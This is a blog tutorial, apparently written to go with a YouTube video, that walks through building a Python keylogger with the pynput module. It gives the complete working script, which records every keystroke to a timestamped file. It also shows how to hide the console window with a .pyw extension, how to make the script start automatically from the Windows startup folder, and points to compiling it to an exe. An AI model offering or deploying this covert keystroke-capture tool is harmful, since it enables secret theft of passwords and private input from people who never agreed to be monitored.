title: "Python Keylogger"
date: 2017-12-15
category: YouTube
tags: [python, keyboard, logging, pynput]
feature: feature.jpg
description: "This is a Python keylogger which will work on Windows, Mac and Linux. This script uses the pynput module. This python keylogger will store typed keys in a file in order of when they were typed."

[TOC]

{% with video_id="x8GbWt56TlY" %}{% include 'blog-post-embedYouTube.html' %}{% endwith %}

## PIP
If you haven't used or setup pip before, go to my tutorial at [how-to-setup-pythons-pip]({{ url_for('blog_post', path='how-to-setup-pythons-pip') }}) to setup pip. This is needed to install pynput to get keys typed.

## Installing Pynput
We will be using the pynput module to listen to mouse events. To install this module execute ```pip install pynput``` in cmd. Watch the output to make sure no errors have occurred; it will tell you when the module has been successfully installed.

![Installing pynput](/posts/how-to-get-mouse-clicks-with-python/pynput1.png)

To double check that it was installed successfully, open up IDLE and execute the command ```import pynput```; no errors should occur.

![Testing pynput](/posts/how-to-get-mouse-clicks-with-python/pynput2.png)

## Building the Keylogger
Create a new Python file and import Key and Listener from pynput.keyboard and the logging module.

```python
from pynput.keyboard import Key, Listener
import logging
```

Next set a variable which points to where you want to save the logs; leave this as an empty string to save the log beside the python script. Then setup the logging module as shown below.

```python
log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
```

Then create a definition for keypresses called on_press which takes key as a parameter. In this definition we want to log using the info method the key type casted to a string.

```python
def on_press(key):
    logging.info(str(key))
```

Next setup an instance of Listener and define the on_press method in a with statement and then join the instance to the main thread.

```python
with Listener(on_press=on_press) as listener:
    listener.join()
```

Now save the file with a .pyw file extension to make sure that the console doesn't appear when it's run.

![Save as .pyw](/posts/python-keylogger/pyw.png)

Run the script in IDLE to make sure that you haven't made any errors. Errors will show up in here if some do occur.

## Autostart
To make the script run on startup first go to your startup folder. Hold down the windows button and press "R" or type run in the windows menu to make the run dialog appear.

![shell:startup example](/posts/python-keylogger/run.png)

Now type ```shell:startup``` in the dialog and press enter. This will open a window at your startup folder.

Copy the keylogger into this folder and then create a new folder somewhere else for logs to be saved to. Make sure this folder is not in the startup folder or it will be opened every time the computer has started. Open the keylogger in IDLE and now change the log_dir to the location of the folder you just created. Make sure this folder path uses forward slashes ('/') and contains a forward slash at the end.

## Stopping the Keylogger
To stop the keylogger, open up task manager and look for anything named python as shown below due to windows just showing program names. If you have an older version of windows, I recommend looking for pythonw.exe. Right click on this and end the task.

![Python in task manager](/posts/python-keylogger/taskmgr.png)

## Final Script
```python
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
```

## Compile to EXE
Want to convert this .py to a .exe? Head over to my tutorial at [convert-py-to-exe]({{ url_for('blog_post', path='convert-py-to-exe') }}) to do it in a few easy steps. This tutorial also shows you how to remove the console that shows up, make one file executables and even add an icon.

Converting to .exe will allow the script to run on windows computers without python installed (python is pre-installed on mac and most linux computers)

## Common Issues and Questions

### It doesn't work (general things to try)
Make sure you run the script in IDLE to check for errors you have made

### 'python' is not recognized as an internal or external command
Python hasn't been installed or it hasn't been installed properly. Go to [how-to-setup-pythons-pip]({{ url_for('blog_post', path='how-to-setup-pythons-pip') }}) and follow the tutorial. Just before you enter the scripts folder into the path variable, remove the "\scripts\" part at the end. You will also want to add another path with "\scripts\" to have pip.

### Where are the log files?
They will be located next to the python file (in the current directory for more advanced users). If it hasn't appeared, make sure you run the script in IDLE to check for errors you have made.

### ModuleNotFoundError/ImportError: No module named 'pynput'
Did you install pynput? This error will not occur if you installed it properly. If you have multiple versions of Python, make sure you are installing pynput on the same version as what you are running the script with.

### I got a SyntaxError
Syntax errors are caused by you and these is nothing I can offer to fix it apart from telling you to read the error. They always say where the error is in the output using a ^. Generally people that get this issue have incorrect indentation, brackets in the wrong place or something spelt wrong. You can read about SyntaxError on Python's docs [here](https://docs.python.org/2/tutorial/errors.html#syntax-errors).

### How can I stop the listener?
As documented at [https://pythonhosted.org/pynput/keyboard.html](https://pythonhosted.org/pynput/keyboard.html) you can use pynput.keyboard.Listener.stop() to stop listening.

### "Open command window here" isn't shown when I shift right click?
Make sure you are holding down shift. If you are using new versions of Windows, this has been replaced by "Open PowerShell Window Here". Using this method will work exactly the same for this tutorial; so go ahead and use PowerShell.
